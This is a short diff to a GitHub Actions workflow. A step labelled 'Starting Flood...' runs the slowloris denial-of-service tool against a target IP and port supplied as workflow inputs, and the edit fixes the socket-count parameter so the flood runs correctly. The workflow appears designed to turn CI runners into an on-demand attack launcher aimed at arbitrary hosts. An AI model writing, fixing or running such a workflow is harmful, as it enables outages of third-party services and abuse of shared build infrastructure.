@@ -31,4 +31,4 @@ jobs:
         if [ -f requirements.txt ]; then sudo pip install -r requirements.txt; fi
     - name: Starting Flood...
       run: |
-        sudo slowloris ${{ github.event.inputs.iptgt }} -p ${{ github.event.inputs.portgt }} -s {{ github.event.inputs.socket }} -ua
+        sudo slowloris ${{ github.event.inputs.iptgt }} -p ${{ github.event.inputs.portgt }} -s ${{ github.event.inputs.socket }} -ua
